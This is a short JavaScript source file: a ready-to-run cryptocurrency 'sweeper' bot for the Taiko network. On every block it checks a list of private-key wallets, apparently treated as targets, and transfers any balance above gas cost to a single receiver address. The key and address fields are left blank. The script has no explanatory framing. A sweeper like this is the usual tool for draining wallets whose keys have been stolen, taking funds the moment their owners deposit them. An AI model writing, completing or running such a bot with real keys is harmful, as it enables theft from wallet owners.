const { ethers } = require("ethers");
const { BigNumber, utils } = ethers;

const provider = new ethers.providers.JsonRpcProvider(
    "https://rpc.ankr.com/taiko"
);
const addressReceiver = "";
const privateKeys = [
    "",
];
// 

const bot = async () => {

    provider.on("block", async (e) => {

        console.log(`Listening new block: ${e} waiting..)`);

        for (let i = 0; i < privateKeys.length; i++) {
            const _target = new ethers.Wallet(privateKeys[i]);
            const target = _target.connect(provider);
            const balance = await provider.getBalance(target.address);
            console.log("Wallet balance: ", ethers.utils.formatEther(balance));

            const gasLimit = 21001; // default 21000
            const gasPrice = await provider.getGasPrice();
            console.log(`GWEI : ${gasPrice}`)

            const maxGasFee = BigNumber.from(gasLimit).mul(gasPrice);
            console.log("Tx gas price: ", ethers.utils.formatEther(maxGasFee));

            if (balance.sub(maxGasFee) > 0) {
                console.log("NEW ACCOUNT WITH ETH!");
                const amount = balance.sub(maxGasFee);
                try {
                    const tx = await target.sendTransaction({
                        to: addressReceiver,
                        value: amount,
                        gasPrice: gasPrice,
                        gasLimit: gasLimit,
                    });
                    console.log(`https://taikoscan.io/tx/${tx.hash}`)
                    console.log(
                        `Success! transfered --> ${ethers.utils.formatEther(balance)}`
                    );
                } catch (e) {
                    console.log(`error: ${e}`);
                }
            }
        }
    });
};

bot();
